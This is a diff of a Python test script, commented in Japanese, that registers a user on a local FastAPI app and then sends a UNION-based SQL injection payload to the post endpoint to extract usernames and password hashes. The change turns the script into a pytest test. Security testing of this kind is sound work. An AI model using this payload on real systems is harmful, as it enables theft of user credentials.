@@ -1,6 +1,7 @@
 import requests
 import secrets
 import string
+import pytest
 
 # APIのベースURL
 BASE_URL = "http://localhost:8000"  # FastAPIのデフォルトのアドレスとポート
@@ -36,28 +37,28 @@ def create_post(title, content, token):
     return response.json()
 
 # 投稿取得（SQLiを悪用してユーザ情報を取得）
-def malicious_get_post(post_id):
-    payload = f"{post_id} UNION SELECT id, username, hashed_password, 1 FROM users"
-    response = requests.get(f"{BASE_URL}/post/{payload}")
+def malicious_get_post(post_id, token):
+    headers = {}
+    if token:
+        headers["Authorization"] = f"Bearer {token}"
+    payload = f"{post_id} UNION SELECT id, username, hashed_password, 1, 1 FROM users"
+    response = requests.get(f"{BASE_URL}/post/{payload}", headers=headers)
     return response.json()
 
-if __name__ == "__main__":
-    # usernameとpasswordを生成
+@pytest.fixture(scope="module")
+def user_data():
     username = generate_random_string(10)
     password = generate_random_string(10)
-
-    # ユーザー登録
     user_info = register_user(username, password)
-    print(f"Registered User: {user_info}")
-
-    # ログイン
     token = login_user(username, password)
-    print(f"Access Token: {token}")
-
-    # 投稿作成
     post = create_post("Test Title", "Test Content", token)
-    print(f"Created Post: {post}")
+    return username, password, user_info, token, post
 
-    # 投稿取得
-    post = malicious_get_post(post["id"])
-    print(f"Post: {post}")
+def test_sql_injection_attack(user_data):
+    _, _, _, token, post = user_data
+
+    # 悪意のあるSQLi攻撃をシミュレート
+    malicious_result = malicious_get_post(post["id"], token)
+    
+    # もしSQLiが成功した場合、以下の情報が返されることを想定
+    assert len(malicious_result) > 0
